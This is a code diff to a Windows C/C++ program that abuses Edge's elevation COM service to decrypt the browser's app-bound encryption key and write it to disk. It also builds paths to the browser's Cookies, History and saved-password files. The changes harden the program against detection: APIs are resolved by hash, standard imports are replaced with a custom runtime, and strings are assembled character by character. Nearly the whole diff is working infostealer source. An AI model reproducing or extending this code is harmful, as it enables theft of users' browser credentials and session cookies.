@@ -1,6 +1,6 @@
-#include <Windows.h>
-#include <Shlobj.h>
-#include <Shlobj_core.h>
+#include "apilex.h"
+#include "../../../Sable/CRT/CRT/CRT.h"
+
 #include "Common.h"
 
 typedef enum _PROTECTION_LEVEL
@@ -119,6 +119,31 @@ typedef PROCESSENTRY32W* LPPROCESSENTRY32W;
 
 
 int main() {
+    ApiResolve apiResolve{};
+    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
+    _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)apiResolve.GetApiAddress(lpKernel32, hashLoadLibraryA);
+    const char* sOle32 = "ole32.dll";
+    LPVOID lpOle32 = pLoadLibraryA(sOle32);
+    const char* sOleaut32 = "oleaut32.dll";
+    LPVOID lpOleaut32 = pLoadLibraryA(sOleaut32);
+    const char* sShell32 = "shell32.dll";
+    LPVOID lpShell32 = pLoadLibraryA(sShell32);
+    _CloseHandle pCloseHandle = (_CloseHandle)apiResolve.GetApiAddress(lpKernel32, hashCloseHandle);
+    _CoCreateInstance pCoCreateInstance = (_CoCreateInstance)apiResolve.GetApiAddress(lpOle32, hashCoCreateInstance);
+    _CoInitializeEx pCoInitializeEx = (_CoInitializeEx)apiResolve.GetApiAddress(lpOle32, hashCoInitializeEx);
+    _CoSetProxyBlanket pCoSetProxyBlanket = (_CoSetProxyBlanket)apiResolve.GetApiAddress(lpOle32, hashCoSetProxyBlanket);
+    _CoUninitialize pCoUninitialize = (_CoUninitialize)apiResolve.GetApiAddress(lpOle32, hashCoUninitialize);
+    _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
+    _ExitThread pExitThread = (_ExitThread)apiResolve.GetApiAddress(lpKernel32, hashExitThread);
+    _GetFileSize pGetFileSize = (_GetFileSize)apiResolve.GetApiAddress(lpKernel32, hashGetFileSize);
+    _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
+    _SHGetFolderPathA pSHGetFolderPathA = (_SHGetFolderPathA)apiResolve.GetApiAddress(lpShell32, hashSHGetFolderPathA);
+    _SysAllocStringByteLen pSysAllocStringByteLen = (_SysAllocStringByteLen)apiResolve.GetApiAddress(lpOleaut32, hashSysAllocStringByteLen);
+    _SysFreeString pSysFreeString = (_SysFreeString)apiResolve.GetApiAddress(lpOleaut32, hashSysFreeString);
+    _SysStringByteLen pSysStringByteLen = (_SysStringByteLen)apiResolve.GetApiAddress(lpOleaut32, hashSysStringByteLen);
+    _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
+    const char* logpath = "C:\\Users\\vuong\\log.txt";
+    WriteMessageToFile(logpath, "start");
     CLSID EdgeCLSID = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
     IID EdgeIID = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
     IElevatorEdge* pElevatorEdge = NULL;
@@ -132,12 +157,12 @@ int main() {
         );
 
     char path[MAX_PATH] = { 0 };
-    if (SHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
+    if (pSHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
         return 1;
     }
 
     char pathEdge[MAX_PATH] = { 0 };
-    memcpy(path, pathEdge, MAX_PATH);
+    crt_memcpy(pathEdge, path, MAX_PATH);
     char sSubEdge[] = {
         '\\','M','i','c','r','o','s','o','f','t','\\',
         'E','d','g','e','\\',
@@ -146,7 +171,7 @@ int main() {
         '\0'
     };
 
-    memcpy(sSubEdge, pathEdge + strlen(pathEdge), MAX_PATH - strlen(pathEdge));
+    crt_memcpy(pathEdge + crt_strlen(pathEdge), sSubEdge, MAX_PATH - crt_strlen(pathEdge));
 
     char sLocalState[] = {
         '\\','M','i','c','r','o','s','o','f','t','\\',
@@ -155,11 +180,11 @@ int main() {
         'L','o','c','a','l',' ','S','t','a','t','e',
         '\0'
     };
-    int size = strlen(path);
-    memcpy(sLocalState, path + strlen(path), MAX_PATH - strlen(path));
+    int size = crt_strlen(path);
+    crt_memcpy(path + crt_strlen(path), sLocalState, MAX_PATH - crt_strlen(path));
 
     char pathMal[MAX_PATH] = { 0 };
-    if (SHGetFolderPathA(NULL, 0x001a, NULL, 0, pathMal)) {
+    if (pSHGetFolderPathA(NULL, 0x001a, NULL, 0, pathMal)) {
         return 1;
     }
     char sMal[] = {
@@ -171,36 +196,36 @@ int main() {
     char historyPath[MAX_PATH] = { 0 };
     char passwordPath[MAX_PATH] = { 0 };
 
-    memcpy(sMal, pathMal + strlen(pathMal), MAX_PATH - strlen(sMal));
+    crt_memcpy(pathMal + crt_strlen(pathMal), sMal, MAX_PATH - crt_strlen(sMal));
 
-    memcpy(pathMal, keyPath, MAX_PATH);
+    crt_memcpy(keyPath, pathMal, MAX_PATH);
     char keyFileName[] = { '\\', 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '.', 'd', 'b', '\0' };
-    memcpy(keyFileName, keyPath + strlen(keyPath), MAX_PATH - strlen(keyPath));
+    crt_memcpy(keyPath + crt_strlen(keyPath), keyFileName, MAX_PATH - crt_strlen(keyPath));
 
-    memcpy(pathMal, cookiesPath, MAX_PATH);
-    memcpy(pathMal, historyPath, MAX_PATH);
-    memcpy(pathMal, passwordPath, MAX_PATH);
+    crt_memcpy(cookiesPath, pathMal, MAX_PATH);
+    crt_memcpy(historyPath, pathMal, MAX_PATH);
+    crt_memcpy(passwordPath, pathMal, MAX_PATH);
     char historyFilename[] = { '\\', 'H', 'i', 's', 't', 'o', 'r', 'y', '\0' };
     char cookiesFilename[] = { '\\', 'C', 'o', 'o', 'k', 'i', 'e', 's', '\0' };
     char passwordFilename[] = { '\\', 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', '\0' };
 
-    memcpy(cookiesFilename, cookiesPath + strlen(cookiesPath), MAX_PATH - strlen(cookiesPath));
-    memcpy(historyFilename, historyPath + strlen(historyPath), MAX_PATH - strlen(historyPath));
-    memcpy(passwordFilename, passwordPath + strlen(passwordPath), MAX_PATH - strlen(passwordPath));
+    crt_memcpy(cookiesPath + crt_strlen(cookiesPath), cookiesFilename, MAX_PATH - crt_strlen(cookiesPath));
+    crt_memcpy(historyPath + crt_strlen(historyPath), historyFilename, MAX_PATH - crt_strlen(historyPath));
+    crt_memcpy(passwordPath + crt_strlen(passwordPath), passwordFilename, MAX_PATH - crt_strlen(passwordPath));
 
     char orCookiesPath[MAX_PATH] = { 0 };
     char orHistoryPath[MAX_PATH] = { 0 };
     char orPasswordPath[MAX_PATH] = { 0 };
-    memcpy(pathEdge, orCookiesPath, MAX_PATH);
-    memcpy(pathEdge, orHistoryPath, MAX_PATH);
-    memcpy(pathEdge, orPasswordPath, MAX_PATH);
+    crt_memcpy(orCookiesPath, pathEdge, MAX_PATH);
+    crt_memcpy(orHistoryPath, pathEdge, MAX_PATH);
+    crt_memcpy(orPasswordPath, pathEdge, MAX_PATH);
 
     char network[] = { '\\', 'N', 'e', 't', 'w', 'o', 'r', 'k', '\0' };
 
-    memcpy(network, orCookiesPath + strlen(orCookiesPath), MAX_PATH - strlen(orCookiesPath));
-    memcpy(cookiesFilename, orCookiesPath + strlen(orCookiesPath), MAX_PATH - strlen(orCookiesPath));
-    memcpy(historyFilename, orHistoryPath + strlen(orHistoryPath), MAX_PATH - strlen(orHistoryPath));
-    memcpy(passwordFilename, orPasswordPath + strlen(orPasswordPath), MAX_PATH - strlen(orPasswordPath));
+    crt_memcpy(orCookiesPath + crt_strlen(orCookiesPath), network, MAX_PATH - crt_strlen(orCookiesPath));
+    crt_memcpy(orCookiesPath + crt_strlen(orCookiesPath), cookiesFilename, MAX_PATH - crt_strlen(orCookiesPath));
+    crt_memcpy(orHistoryPath + crt_strlen(orHistoryPath), historyFilename, MAX_PATH - crt_strlen(orHistoryPath));
+    crt_memcpy(orPasswordPath + crt_strlen(orPasswordPath), passwordFilename, MAX_PATH - crt_strlen(orPasswordPath));
 
     typedef HANDLE(WINAPI* _CreateFileA)(
         LPCSTR                lpFileName,
@@ -211,28 +236,28 @@ int main() {
         DWORD                 dwFlagsAndAttributes,
         HANDLE                hTemplateFile
         );
-
-    HANDLE hFile = CreateFileA((LPCSTR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    WriteMessageToFile(logpath, path);
+    HANDLE hFile = pCreateFileA((LPCSTR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (!hFile) { return 1; }
 
-    if (!GetFileSize) { return 1; }
-    DWORD dwFileSize = GetFileSize(hFile, NULL);
+    if (!pGetFileSize) { return 1; }
+    DWORD dwFileSize = pGetFileSize(hFile, NULL);
     if (dwFileSize == 0) { return 1; }
 
-    LPVOID fileBuf = malloc(dwFileSize + 1);
+    LPVOID fileBuf = crt_malloc(dwFileSize + 1);
     if (!fileBuf) {
         return 1;
     }
 
-    if (!ReadFile(hFile, fileBuf, dwFileSize, NULL, NULL)) {
+    if (!pReadFile(hFile, fileBuf, dwFileSize, NULL, NULL)) {
         return 1;
     }
 
-    CloseHandle(hFile);
+    pCloseHandle(hFile);
     char patternKey[] = { 'a', 'p', 'p', '_', 'b', 'o', 'u', 'n', 'd', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '"', ':', '"', '\0' };
-    char* keyPointer = strstr((char*)fileBuf, patternKey);
+    char* keyPointer = crt_strstr((char*)fileBuf, patternKey);
     if (!keyPointer) { return 1; }
-    keyPointer = keyPointer + strlen(patternKey);
+    keyPointer = keyPointer + crt_strlen(patternKey);
     int sizeKeyB64 = 0;
     for (int i = 0; ; i++) {
         if (keyPointer[i] == '"') {
@@ -248,12 +273,12 @@ int main() {
         DWORD  dwCoInit
         );
 
-    hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+    hr = pCoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
     if (FAILED(hr)) {
         return 1;
     }
 
-    hr = CoCreateInstance(
+    hr = pCoCreateInstance(
         EdgeCLSID,
         nullptr,
         CLSCTX_LOCAL_SERVER,
@@ -262,7 +287,7 @@ int main() {
     );
 
     if (FAILED(hr)) {
-        CoUninitialize();
+        pCoUninitialize();
         return 1;
     }
 
@@ -278,7 +303,7 @@ int main() {
         );
 
 
-    hr = CoSetProxyBlanket(
+    hr = pCoSetProxyBlanket(
         (IUnknown*)pElevatorEdge,
         RPC_C_AUTHN_DEFAULT,
         RPC_C_AUTHZ_DEFAULT,
@@ -295,10 +320,10 @@ int main() {
     char* encKey = Base64Decode(keyPointer, length);
 
 
-    BSTR bstrEncKey = SysAllocStringByteLen(encKey + 4, length - 4);
+    BSTR bstrEncKey = pSysAllocStringByteLen(encKey + 4, length - 4);
     hr = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrEncKey, &decryptedDataBSTR, &dwLastError);
     if (bstrEncKey) {
-        SysFreeString(bstrEncKey);
+        pSysFreeString(bstrEncKey);
     }
 
     if (FAILED(hr)) {
@@ -315,8 +340,8 @@ int main() {
         //Write key to file in desktop
         //char keyFileName[] = { 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '\0' };
         //memcpy(keyFileName, pathMal + strlen(pathMal), MAX_PATH - strlen(pathMal));
-        HANDLE hFile = CreateFileA(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        WriteFile(hFile, decryptedDataBSTR, SysStringByteLen(decryptedDataBSTR), NULL, NULL);
+        HANDLE hFile = pCreateFileA(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        pWriteFile(hFile, decryptedDataBSTR, pSysStringByteLen(decryptedDataBSTR), NULL, NULL);
 
         //CreateCopyFile(cookiesFilename, cookiesPath);
         //CreateCopyFile(historyFilename, historyPath);
@@ -348,13 +373,14 @@ int main() {
         //CreateCopyFile(cookiesFilename, cookiesPath);
         //CreateCopyFile(passwordFilename, passwordPath);
 
-        SysFreeString(decryptedDataBSTR);
-        CloseHandle(hFile);
+        pSysFreeString(decryptedDataBSTR);
+        pCloseHandle(hFile);
     }
 
-    free(fileBuf);
+    crt_free(fileBuf);
     //constexpr unsigned int hashExitThread = ComplexHashForAnsi("ExitThread");
     //typedef VOID(WINAPI* _ExitThread)(DWORD);
     //_ExitThread pExitThread = (_ExitThread)apiResolve.GetApiAddress(lpKernel32, hashExitThread);
     //pExitThread(0);
+    pExitThread(0);
 }
